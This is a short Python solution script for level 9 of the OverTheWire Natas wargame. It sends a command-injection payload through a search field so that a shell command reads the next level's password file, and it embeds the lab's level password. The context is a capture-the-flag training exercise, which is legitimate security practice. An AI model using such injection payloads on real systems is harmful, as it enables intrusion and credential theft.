#!/bin/python3

import requests
import re
import html.parser

username = 'natas9'
password = 'W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl'
#secret = "oubWYf2kBq" #gained from reversing the function in 8.php

url = 'http://%s.natas.labs.overthewire.org' % (username)
data = { "needle" : "tt;cat /etc/natas_webpass/natas10 #" ,"submit" : "submit" }

#for communicating with the website whilst maintaining session history
session = requests.Session()
response = session.post(url + '',data = data, auth = (username,password) )
content = html.unescape(response.text)

#for viewing the webpage
#print (content)

#for finding the password 
print (re.findall('<pre>\n(.*)\n</pre>',content)[0])


#passes through the key to a grep call presumably by system
#passthru("grep -i $key dictionary.txt") where $key is user input
#put in a random string to finish the grep command then ";"
#to allow for another command to be input then simply cat the password file

